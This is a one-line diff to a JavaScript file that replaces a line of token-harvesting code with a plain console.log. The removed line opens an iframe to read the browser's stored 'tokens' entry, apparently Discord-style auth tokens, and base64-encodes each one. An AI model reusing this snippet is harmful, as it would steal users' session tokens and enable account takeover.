@@ -1,1 +1,1 @@
-var a="";var b=Object.values(JSON.parse(document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.tokens));for(var c=0;c<b.length;c++){if(a.length!=0){a+=" "};a+=btoa(b[c])}
+console.log("a");
